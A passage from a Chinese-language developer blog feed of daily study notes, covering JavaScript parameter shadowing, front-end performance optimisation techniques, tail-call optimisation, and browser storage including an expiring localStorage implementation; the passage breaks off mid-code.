        <content type="html"><![CDATA[<h1 id="函数参数命名出现的问题"><a href="#函数参数命名出现的问题" class="headerlink" title="函数参数命名出现的问题"></a>函数参数命名出现的问题</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">// 基本类型</span><br><span class="line">let foo = 5;</span><br><span class="line"></span><br><span class="line">// 定义一个貌似可以改变基本类型值的函数</span><br><span class="line">function addTwo(num) &#123;</span><br><span class="line">    num += 2;</span><br><span class="line">&#125;</span><br><span class="line">// 和前面的函数一样</span><br><span class="line">function addTwo_v2(foo) &#123;</span><br><span class="line">    foo += 2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 调用第一个函数，并传入基本类型值作为参数</span><br><span class="line">addTwo(foo);</span><br><span class="line">// Getting the current Primitive value</span><br><span class="line">console.log(foo);   // 5</span><br><span class="line"></span><br><span class="line">// 尝试调用第二个函数...</span><br><span class="line">addTwo_v2(foo);</span><br><span class="line">console.log(foo);   // 5</span><br></pre></td></tr></table></figure><p><strong>你是否认为会得到7，而不是5？如果是，请看看代码是如何运行的：</strong></p><ul><li>addTwo和addTwo_v2函数调用时，JavaScript 会检查标识符foo的值，从而准确无误的找到第一行实例化变量的声明语句。</li><li>找到以后，JavaScript 将其作为参数传递给函数的形参。</li><li>在执行函数体内语句之前，JavaScript 会将传递进来的参数（基本类型的值）复制一份，<font color="#FF00FF">创建一个本地副本。</font>这个副本只存在于该函数的作用域中，我们能够通过指定在函数中的标识符访问到它（addTwo中的num，addTwo_v2中的foo）。</li><li>接下来，函数体中的语句开始执行：<ul><li>第一个函数中，创建了本地num参数，num的值加 2，但这个值并不是原来的foo的值。</li><li>第二个函数中，创建了本地参数foo，并将它的值加 2，<font color="#FF00FF">这个值不是外部 foo 的值。在这种情况下，外部的foo变量不能以任何方式被访问到。这是因为 JavaScript 的词法作用域（lexical scoping）所导致的变量覆盖，本地的变量foo覆盖了外部的变量foo。</font>欲知详情，请参阅闭包。</li></ul></li><li>综上所述，函数中的任何操作都不会影响到最初的foo，我们操作的只不过是它的副本。</li></ul>]]></content>
      
      
      <categories>
          
          <category> plan </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
            <tag> graduate student </tag>
            
            <tag> study </tag>
            
            <tag> plan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>性能优化(第十五天)</title>
      <link href="/2022/08/10/%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96(%E7%AC%AC%E5%8D%81%E4%BA%94%E5%A4%A9)/"/>
      <url>/2022/08/10/%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96(%E7%AC%AC%E5%8D%81%E4%BA%94%E5%A4%A9)/</url>
      
        <content type="html"><![CDATA[<h1 id="前端性能优化手段"><a href="#前端性能优化手段" class="headerlink" title="前端性能优化手段"></a>前端性能优化手段</h1><p>前端性能优化手段从以下几个方面入手：<strong>加载优化、执行优化、渲染优化、样式优化、脚本优化</strong></p><p><strong>加载优化:</strong> 减少HTTP请求、缓存资源、压缩代码、无阻塞、首屏加载、按需加载、预加载、压缩图像、减少Cookie、避免重定向、异步加载第三方资源</p><p><strong>执行优化：</strong> CSS写在头部，JS写在尾部并异步、避免img、iframe等的src为空、尽量避免重置图像大小、图像尽量避免使用DataURL</p><p><strong>渲染优化：</strong> 设置viewport、减少DOM节点、优化动画、优化高频事件、GPU加速</p><p><strong>样式优化：</strong> 避免在HTML中书写style、避免CSS表达式、移除CSS空规则、正确使用display：display、不滥用float等</p><p><strong>脚本优化：</strong> 减少重绘和回流、缓存DOM选择与计算、缓存.length的值、尽量使用事件代理、尽量使用id选择器、touch事件优化</p><h2 id="加载优化"><a href="#加载优化" class="headerlink" title="加载优化"></a>加载优化</h2><ol><li>减少HTTP请求：尽量减少页面的请求数(首次加载同时请求数不能超过4个)，移动设备浏览器同时响应请求为4个请求(Android支持4个，iOS5+支持6个)<ul><li>合并CSS和JS</li><li>使用CSS精灵图</li></ul></li><li>缓存资源：使用缓存可减少向服务器的请求数，节省加载时间，所有静态资源都要在服务器端设置缓存，并且尽量使用长缓存(使用时间戳更新缓存)<ul><li>缓存一切可缓存的资源</li><li>使用长缓存</li><li>使用外联的样式和脚本</li></ul></li><li>压缩代码：减少资源大小可加快网页显示速度，对代码进行压缩，并在服务器端设置GZip<ul><li>压缩代码(多余的缩进、空格和换行符)</li><li>启用Gzip</li></ul></li><li>无阻塞：头部内联的样式和脚本会阻塞页面的渲染，样式放在头部并使用link方式引入，脚本放在尾部并使用<font color="#FF8C00">异步方式加载</font></li><li>首屏加载：首屏快速显示可大大提升用户对页面速度的感知，应尽量针对首屏的快速显示做优化</li><li>按需加载：将不影响首屏的资源和当前屏幕不用的资源放到用户需要时才加载，可大大提升显示速度和降低总体流量(按需加载会导致大量重绘，影响渲染性能)<ul><li>懒加载</li><li>滚屏加载</li><li>Media Query加载</li></ul></li><li>预加载：大型资源页面可使用Loading，资源加载完成后再显示页面，但加载时间过长，会造成用户流失</li></ol><ul><li>可感知Loading：进入页面时Loading</li><li>不可感知Loading：提前加载下一页</li></ul><ol start="8"><li>压缩图像：使用图像时选择最合适的格式和大小，然后使用工具压缩，同时在代码中用srcset来按需显示(过度压缩图像大小影响图像显示效果)<ul><li>使用TinyJpg和TinyPng压缩图像</li><li>使用CSS3、SVG、IconFont代替图像</li><li>使用img的srcset按需加载图像</li><li>选择合适的图像：webp优于jpg，png8优于gif</li><li>选择合适的大小：首次加载不大于1014kb、不宽于640px</li><li>PS切图时D端图像保存质量为80，M端图像保存质量为60</li></ul></li><li>减少Cookie：Cookie会影响加载速度，静态资源域名不使用Cookie</li><li>避免重定向：重定向会影响加载速度，在服务器正确设置避免重定向</li><li>异步加载第三方资源：第三方资源不可控会影响页面的加载和显示，要异步加载第三方资源</li></ol><h2 id="执行优化"><a href="#执行优化" class="headerlink" title="执行优化"></a>执行优化</h2><ul><li><strong>CSS写在头部，JS写在尾部并异步</strong></li><li><font color="#FF00FF">避免img、iframe等的src为空：空src会重新加载当前页面，影响速度和效率</font></li><li><font color="#FF00FF">尽量避免重置图像大小：多次重置图像大小会引发图像的多次重绘，影响性能</font></li><li><font color="#FF00FF">图像尽量避免使用DataURL</font>：DataURL图像没有使用图像的压缩算法，文件会变大，并且要解码后再渲染，加载慢耗时长</li></ul><h2 id="渲染优化"><a href="#渲染优化" class="headerlink" title="渲染优化"></a>渲染优化</h2><ul><li><strong>设置viewport：</strong> HTML的viewport可加速页面的渲染</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, user-scalable=no, initial-scale=1, minimum-scale=1, maximum-scale=1&quot;&gt;</span><br></pre></td></tr></table></figure><ul><li><p><strong>减少DOM节点</strong>：DOM节点太多影响页面的渲染，尽量减少DOM节点</p></li><li><p><strong>优化动画</strong></p><ul><li>尽量使用CSS3动画</li><li>合理使用requestAnimationFrame动画代替setTimeout</li><li>适当使用Canvas动画：5个元素以内使用CSS动画，5个元素以上使用Canvas动画，iOS8+可使用WebGL动画</li></ul></li><li><p><strong>优化高频事件</strong>：scroll、touchmove等事件可导致多次渲染</p><ul><li>函数节流</li><li>函数防抖</li><li>使用requestAnimationFrame监听帧变化：使得在正确的时间进行渲染</li><li>增加响应变化的时间间隔：减少重绘次数</li></ul></li><li><p><strong>GPU加速</strong>：使用某些HTML5标签和CSS3属性会触发GPU渲染，请合理使用(过渡使用会引发手机耗电量增加)</p><ul><li>HTML标签：video、canvas、webgl</li><li>CSS属性：opacity、transform、transition</li></ul></li></ul><h2 id="样式优化"><a href="#样式优化" class="headerlink" title="样式优化"></a>样式优化</h2><ol><li>避免在HTML中书写style</li><li>避免CSS表达式：<font color="#FF00FF">CSS表达式的执行需跳出CSS树的渲染</font></li><li>移除CSS空规则：<font color="#FF00FF">CSS空规则增加了css文件的大小，影响CSS树的执行</font></li><li><font color="#FF00FF">正确使用display</font>：display会影响页面的渲染<ul><li>display:inline后不应该再使用float、margin、padding、width和height</li><li>display:inline-block后不应该再使用float</li><li>display:block后不应该再使用vertical-align</li><li>display:table-*后不应该再使用float和margin</li></ul></li><li>不滥用float：<font color="#FF8C00">float在渲染时计算量比较大，尽量减少使用</font></li><li>不滥用Web字体：Web字体需要下载、解析、重绘当前页面，尽量减少使用</li><li>不声明过多的font-size：过多的font-size影响CSS树的效率</li><li><font color="#FF00FF">值为0时不需要任何单位：为了浏览器的兼容性和性能，值为0时不要带单位</font></li><li>标准化各种浏览器前缀<ul><li>无前缀属性应放在最后</li><li>CSS动画属性<font color="#FF00FF">只用-webkit-、无前缀两种</font></li><li>其它前缀为-webkit-、-moz-、-ms-、无前缀四种：Opera改用blink内核，-o-已淘汰</li></ul></li><li>避免让选择符看起来像正则表达式：<font color="#FF00FF">高级选择符执行耗时长且不易读懂，避免使用</font></li></ol><h2 id="脚本优化-【TODO】"><a href="#脚本优化-【TODO】" class="headerlink" title="脚本优化 【TODO】"></a>脚本优化 【TODO】</h2><ol><li>减少重绘和回流<ul><li>避免不必要的DOM操作</li><li>避免使用document.write</li><li>减少drawImage</li><li>尽量改变class而不是style，使用classList代替className</li></ul></li><li>缓存DOM选择与计算：每次DOM选择都要计算和缓存</li><li>缓存.length的值：每次.length计算用一个变量保存值</li><li>尽量使用事件代理：避免批量绑定事件</li><li>尽量使用id选择器：<font color="#FF00FF">id选择器选择元素是最快</font>的</li><li>touch事件优化：使用tap(touchstart和touchend)代替click(注意touch响应过快，易引发误操作)</li></ol><h2 id="常用"><a href="#常用" class="headerlink" title="常用"></a>常用</h2><h3 id="雅虎"><a href="#雅虎" class="headerlink" title="雅虎"></a>雅虎</h3><p><img src="http://files.shanqianche.cn/20228/1660119419712.png" alt="雅虎军规"></p><p><img src="http://files.shanqianche.cn/20228/1660119467606.png" alt="雅虎军规"><br><img src="http://files.shanqianche.cn/20228/1660119493503.png" alt="雅虎军规"></p><h3 id="2-5-8原则"><a href="#2-5-8原则" class="headerlink" title="2-5-8原则"></a>2-5-8原则</h3><p>在前端开发中，此规则作为一种开发指导思路，针对浏览器页面的性能优化。</p><p>用户在2秒内得到响应，会感觉页面的响应速度很快 Fast<br>用户在2<del>5秒间得到响应，会感觉页面的响应速度还行 Medium<br>用户在5</del>8秒间得到响应，会感觉页面的响应速度很慢，但还可以接受 Slow<br>用户在8秒后仍然无法得到响应，会感觉页面的响应速度垃圾死了</p><h1 id="一个官网怎么优化，有哪些性能指标，如何量化"><a href="#一个官网怎么优化，有哪些性能指标，如何量化" class="headerlink" title="一个官网怎么优化，有哪些性能指标，如何量化"></a>一个官网怎么优化，有哪些性能指标，如何量化</h1><blockquote><p><font color="#FF8C00">对首屏加载速度影响最大的还是资源大小，请求数量，请求速度等。代码方面，前端一般很难写出严重影响速度的代码。减小资源大小，可以用各种压缩，懒加载，预加载，异步加载等方法。</font>减少请求数量可以使用雪碧图，搭建node中台将多个请求合并成一个等。<font color="#FF8C00">对于官网这种项目，最好使用服务端渲染</font>，<font color="#FF00FF">首屏快之外，也有利于SEO。</font></p></blockquote><h2 id="检测方案："><a href="#检测方案：" class="headerlink" title="检测方案："></a>检测方案：</h2><p>使用lighthouse进行性能检测，并对lighthouse提出的建议进行优化</p><h2 id="具体优化方案："><a href="#具体优化方案：" class="headerlink" title="具体优化方案："></a>具体优化方案：</h2><p>通过静态化、图片懒加载、图片压缩、异步加载（js和css）、优化代码等方式，以下是具体方法</p><h2 id="静态化"><a href="#静态化" class="headerlink" title="静态化"></a>静态化</h2><p><strong>服务端渲染，“直出”页面，具有较好的SEO和首屏加载速度。主要还有以下的优点：</strong></p><ul><li>使用jsp模板语法（百度后发现是用Velocity模板语法）渲染页面，减少了js文件体积</li><li>减少了请求数量</li><li>因为不用等待大量接口返回，加快了首屏时间</li></ul><p><strong>可以尝试Vue的服务端渲染。首页目前有部分是用接口读取数据，然后用jq进行渲染，性能上应该不如Virtual DOM，不过内容不多。</strong></p><h2 id="图片懒加载"><a href="#图片懒加载" class="headerlink" title="图片懒加载"></a>图片懒加载</h2><p><font color="#FF8C00">这是一个很重要的优化项。</font>因为官网上有很多图片，而且编辑们上传文章图片的时候一般没有压缩，但是很多图片的体积都很大。还有一个轮播图，20张图标，最小的几十K，最大的两百多K。对于图片来源不可控的页面，懒加载是个很实用的操作，直接将首屏加载的资源大小减少了十几M。</p><h2 id="图片压缩"><a href="#图片压缩" class="headerlink" title="图片压缩"></a>图片压缩</h2><p>对于来源可控，小图标等图片可以用雪碧图，base64等方法进行优化。目前只是用工具压缩了图片大小，后续可以考虑在webpack打包的时候生成雪碧图。</p><h2 id="异步加载js"><a href="#异步加载js" class="headerlink" title="异步加载js"></a>异步加载js</h2><p><font color="#FF8C00">通过标签引入的js文件，可以设置defer，async属性让其异步加载，而不会阻塞渲染。defer和async的区别在于async加载完就立即执行，没有考虑依赖，标签顺序等。而defer加载完后会等它前面引入的文件执行完再执行。<font color="#FF8C00">一般defer用的比较多，async只能用在那些跟别的文件没有联系的孤儿脚本上</font>。</font></p><h2 id="异步加载css"><a href="#异步加载css" class="headerlink" title="异步加载css"></a>异步加载css</h2><p>没想到css也能异步加载，但这是lighthouse给出的建议。找了一下发现有以下两种方法：<br>一是通过js脚本在文档中插入标签<br>二是通过<code>&#39;&#39;</code>的media属性<br><font color="#FF8C00">media属性是媒体查询用的，用于在不同情况下加载不同的css。这里是将其设置为一个不适配当前浏览器环境的值，甚至是不能识别的值，浏览器会认为这个样式文件优先级低，会在不阻塞的情况加载。加载完成后再将media`设置为正常值，让浏览器解析css。</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=&quot;stylesheet&quot; href=&quot;//example.css&quot; media=&quot;none&quot; onload=&quot;this.media=&#x27;all&#x27;&quot;&gt;</span><br></pre></td></tr></table></figure><p><font color="#FF8C00">这里用的是第二种方法。但是webpack注入到html中的外链css还没找到异步加载的方法。</font></p><h2 id="preconnent"><a href="#preconnent" class="headerlink" title="preconnent"></a>preconnent</h2><p>lighthouse建议对于接下来会访问的地址可以<font color="#FF8C00">提前建立连接</font>。一般有一下几种方式。</p><ol><li>dns-prefetch域名预解析</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=&quot;dns-prefetch&quot; href=&quot;//example.com&quot;&gt;</span><br></pre></td></tr></table></figure><ol start="2"><li>preconnet预连接</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=&quot;preconnect&quot; href=&quot;//example.com&quot;&gt;</span><br><span class="line">&lt;link rel=&quot;preconnect&quot; href=&quot;//cdn.example.com&quot; crossorigin&gt;</span><br></pre></td></tr></table></figure><ol start="3"><li>prefetch预加载</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=&quot;prefetch&quot; href=&quot;//example.com/next-page.html&quot; as=&quot;html&quot; crossorigin=&quot;use-credentials&quot;&gt;</span><br><span class="line">&lt;link rel=&quot;prefetch&quot; href=&quot;library.js&quot; as=&quot;script&quot;&gt;</span><br></pre></td></tr></table></figure><ol start="4"><li>prerender预渲染</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=&quot;prerender&quot; href=&quot;//example.com/next-page.html&quot;&gt;</span><br></pre></td></tr></table></figure><p><font color="#FF8C00">这四种层层递进，但是不要连接不需要的资源，反而损耗性能</font>。我在页面上对某些资源用了preconnect，但并没有明显的效果。应该对于在线小说，在线漫画这种场景预加载会更适用。</p><h2 id="代码优化"><a href="#代码优化" class="headerlink" title="代码优化"></a>代码优化</h2><p><font color="#FF8C00">lighthouse上显示主线程耗时最多的是样式和布局，所以对这部分进行优化</font>。主要有一下几点：</p><ul><li>去掉页面上用于布局的table，table本身性能较低，且维护性差，是一种过时的布局方案。</li><li>在去掉table布局的同时减少一些无意义的DOM元素，减少DOM元素的数量和嵌套。</li><li>减少css选择器的嵌套。用sass，less这种css预处理器很容易造成多层嵌套。优化前代码里最多的有七八层嵌套，对性能有一定影响。重构后不超过三层。</li></ul><p><strong>通过上面的重构后，样式布局和渲染时间从lighthouse上看大概减少了300ms。但样式和布局的时间还是最长的，感觉还有优化空间。</strong></p><h3 id="结构优化"><a href="#结构优化" class="headerlink" title="结构优化"></a>结构优化</h3><p>接下来是js代码的优化和重构。因为移除Vue框架，以及用服务端端直出，现在js代码已经减少了大部分。主要有以下几部分：</p><ul><li><font color="#FF8C00">拆分函数，将功能复杂的函数拆分成小函数，让每个函数只做一件事。</font></li><li><font color="#FF8C00">优化分支结构，用对象Object，代替if…else和switch…case</font></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">// 优化前</span><br><span class="line">var getState = function (state) &#123;</span><br><span class="line">  switch (state) &#123;</span><br><span class="line">    case 1:</span><br><span class="line">      return &#x27;up&#x27;;</span><br><span class="line">    case 0:</span><br><span class="line">      return &#x27;stay&#x27;;</span><br><span class="line">    case 2:</span><br><span class="line">      return &#x27;down&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 优化后</span><br><span class="line">var getState = function(state) &#123;</span><br><span class="line">  var stateMap = &#123;</span><br><span class="line">    1: &#x27;up&#x27;, 0: &#x27;stay&#x27;, 2: &#x27;down&#x27;</span><br><span class="line">  &#125;</span><br><span class="line">  return stateMap[state]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="优化DOM操作"><a href="#优化DOM操作" class="headerlink" title="优化DOM操作"></a>优化DOM操作</h3><p>DOM操作如改变样式，改变内容可能会引起页面的重绘重排，是比较消耗性能的。网上也有很多优化jq操作的方法。<br>如<font color="#FF8C00">将查询到的DOM使用变量存起来，避免重复查询。以及将多次DOM操作变成一次等。</font>这里重点讲一下第二种。</p><ul><li>常见的需求是渲染一个列表，如果直接在for循环里面append到父元素中，性能是非常差的。幸好原来的操作是将所有DOM用字符串拼接起来，再用html()方法一次性添加到页面中。</li><li>还有另一种方法是使用文档碎片(fragment)。<font color="#FF8C00">通过document.createDocumentFragment()可以新建一个fragment。向fragment中appendChild元素的时候是不会阻塞渲染进程的</font>。最后将fragment替换掉页面上的元素。将fragment元素用appendChild的方法添加到页面上时，实际上添加上去的是它内部的元素，也就是它的子元素。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var fragment = document.createDocumentFragment()</span><br><span class="line">for (var i = 0; i &lt; data.length; i++) &#123;</span><br><span class="line">  var str = &#x27;&lt;div&gt;&#x27; + i + &#x27;&lt;/div&gt;&#x27;</span><br><span class="line">  fragment.appendChild($(str)[0])</span><br><span class="line">&#125;</span><br><span class="line">$(&#x27;.container&#x27;).append(fragment)</span><br></pre></td></tr></table></figure><p><font color="#FF00FF">经过测试，在当前的场景下，使用fragment的速度和html()是差不多的，都是10ms左右。区别在于最后将fragment添加到页面上$(‘.container’).append(fragment)这行代码仅仅花费1ms。也就是说，将fragment插入页面时不会引起页面重绘重排，不会引起阻塞。</font></p><h1 id="尾调用优化"><a href="#尾调用优化" class="headerlink" title="尾调用优化"></a>尾调用优化</h1><p><strong>尾调用是指某个函数的最后一步是调用另一个函数。</strong></p><p>函数调用会在内存形成一个“<font color="#FF8C00">调用记录”，又称“调用帧”</font>，保存调用位置和内存变量等信息。如果在函数A的内部调用函数B，那么在A的调用帧上方，还会形成一个B的调用帧。等到B运行结束，将结果返回到A，B的调用帧才会消失。如果函数B内部还调用函数C，那就还有一个C的调用帧，依次类推。所有的调用帧，就形成一个“<font color="#FF8C00">调用栈</font>”。</p><p><strong>尾调用由于是函数的最后一步操作，所有不需要保留外层函数的调用帧，因为调用位置、内部变量等信息都不会再用到了，只要直接用内层函数的调用帧，取代外层函数的调用帧就可以了。</strong></p><p>如果所有函数都是尾调用，那么完全可以做到每次执行时，调用帧只有一项，这将大大节省内存。这就是“尾调用优化”。注意，<font color="#FF8C00">只有不再用到外层函数的内部变量，内层函数的调用帧才会取代外层函数的调用帧，否则就无法进行“尾调用优化”。</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function addOne(a) &#123;</span><br><span class="line">    var one = 1;</span><br><span class="line">    function inner(b) &#123;</span><br><span class="line">        return b + one;</span><br><span class="line">    &#125;</span><br><span class="line">    return inner(a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> plan </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
            <tag> graduate student </tag>
            
            <tag> study </tag>
            
            <tag> plan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浏览器相关内容(第十四天)</title>
      <link href="/2022/08/10/%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9B%B8%E5%85%B3%E5%86%85%E5%AE%B9(%E7%AC%AC%E5%8D%81%E5%9B%9B%E5%A4%A9)/"/>
      <url>/2022/08/10/%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9B%B8%E5%85%B3%E5%86%85%E5%AE%B9(%E7%AC%AC%E5%8D%81%E5%9B%9B%E5%A4%A9)/</url>
      
        <content type="html"><![CDATA[<h1 id="cookie-sessionStorage-localStorage-区别"><a href="#cookie-sessionStorage-localStorage-区别" class="headerlink" title="cookie sessionStorage localStorage 区别"></a>cookie sessionStorage localStorage 区别</h1><p><strong>共同点：</strong> 都是保存在浏览器端、且同源的</p><p><strong>区别：</strong></p><ol><li><p>cookie数据始终在同源的http请求中携带（即使不需要），即cookie在浏览器和服务器间来回传递，而sessionStorage和localStorage不会自动把数据发送给服务器，仅在本地保存。cookie数据还有路径（path）的概念，可以限制cookie只属于某个路径下</p></li><li><p>存储大小限制也不同，cookie数据不能超过4K，同时因为每次http请求都会携带cookie、所以cookie只适合保存很小的数据，如会话标识。sessionStorage和localStorage虽然也有存储大小的限制，但比cookie大得多，可以达到5M或更大</p></li><li><p>数据有效期不同，sessionStorage：仅在当前浏览器窗口关闭之前有效；localStorage：始终有效，窗口或浏览器关闭也一直保存，因此用作持久数据；cookie：只在设置的cookie过期时间之前有效，即使窗口关闭或浏览器关闭</p></li><li><p>作用域不同，sessionStorage不在不同的浏览器窗口中共享，即使是同一个页面；localstorage在所有同源窗口中都是共享的；cookie也是在所有同源窗口中都是共享的</p></li><li><p>web Storage支持事件通知机制，可以将数据更新的通知发送给监听者</p></li><li><p>web Storage的api接口使用更方便</p></li></ol><h1 id="如何写一个会过期的localStorage，说说想法"><a href="#如何写一个会过期的localStorage，说说想法" class="headerlink" title="如何写一个会过期的localStorage，说说想法"></a>如何写一个会过期的localStorage，说说想法</h1><p><strong>两种方案：惰性删除 和 定时删除</strong></p><h2 id="惰性删除"><a href="#惰性删除" class="headerlink" title="惰性删除"></a>惰性删除</h2><blockquote><p>惰性删除是指，某个键值过期后，该键值不会被马上删除，而是等到下次被使用的时候，才会被检查到过期，此时才能得到删除。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">var lsc = (function (self) &#123;</span><br><span class="line">    var prefix = &#x27;one_more_lsc_&#x27;</span><br><span class="line">    /**</span><br><span class="line">     * 增加一个键值对数据</span><br><span class="line">     * @param key 键</span><br><span class="line">     * @param val 值</span><br><span class="line">     * @param expires 过期时间，单位为秒</span><br><span class="line">     */</span><br><span class="line">    self.set = function (key, val, expires) &#123;</span><br><span class="line">        key = prefix + key;</span><br><span class="line">        val = JSON.stringify(&#123;&#x27;val&#x27;: val, &#x27;expires&#x27;: new Date().getTime() + expires * 1000&#125;);</span><br><span class="line">        localStorage.setItem(key, val);</span><br><span class="line">    &#125;;</span><br><span class="line">    /**</span><br><span class="line">     * 读取对应键的值数据</span><br><span class="line">     * @param key 键</span><br><span class="line">     * @returns &#123;null|*&#125; 对应键的值</span><br><span class="line">     */</span><br><span class="line">    self.get = function (key) &#123;</span><br><span class="line">        key = prefix + key;</span><br><span class="line">        var val = localStorage.getItem(key);</span><br><span class="line">        if (!val) &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line">        val = JSON.parse(val);</span><br><span class="line">        if (val.expires &lt; new Date().getTime()) &#123;</span><br><span class="line">            localStorage.removeItem(key);</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line">        return val.val;</span><br><span class="line">    &#125;;</span><br><span class="line">    return self;</span><br><span class="line">&#125;(lsc || &#123;&#125;));</span><br></pre></td></tr></table></figure><p>上述代码通过惰性删除已经实现了可过期的localStorage缓存，但是也有比较明显的缺点：如果一个key一直没有被用到，即使它已经过期了也永远存放在localStorage。为了弥补这样缺点，我们引入另一种清理过期缓存的策略。</p><h2 id="定时删除"><a href="#定时删除" class="headerlink" title="定时删除"></a>定时删除</h2><blockquote><p>定时删除是指，每隔一段时间执行一次删除操作，并通过限制删除操作执行的次数和频率，来减少删除操作对CPU的长期占用。另一方面定时删除也有效的减少了因惰性删除带来的对localStorage空间的浪费。</p></blockquote><p><strong>每隔一秒执行一次定时删除，操作如下：</strong></p><ol><li>随机测试20个设置了过期时间的key。</li><li>删除所有发现的已过期的key。</li><li>若删除的key超过5个则重复步骤1，直至重复500次。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">var lsc = (function (self) &#123;</span><br><span class="line">    var prefix = &#x27;one_more_lsc_&#x27;</span><br><span class="line">    var list = [];</span><br><span class="line">    //初始化list</span><br><span class="line">    self.init = function () &#123;</span><br><span class="line">        var keys = Object.keys(localStorage);</span><br><span class="line">        var reg = new RegExp(&#x27;^&#x27; + prefix);</span><br><span class="line">        var temp = [];</span><br><span class="line">        //遍历所有localStorage中的所有key</span><br><span class="line">        for (var i = 0; i &lt; keys.length; i++) &#123;</span><br><span class="line">            //找出可过期缓存的key</span><br><span class="line">            if (reg.test(keys[i])) &#123;</span><br><span class="line">                temp.push(keys[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        list = temp;</span><br><span class="line">    &#125;;</span><br><span class="line">    self.init();</span><br><span class="line">    self.check = function () &#123;</span><br><span class="line">        if (!list || list.length == 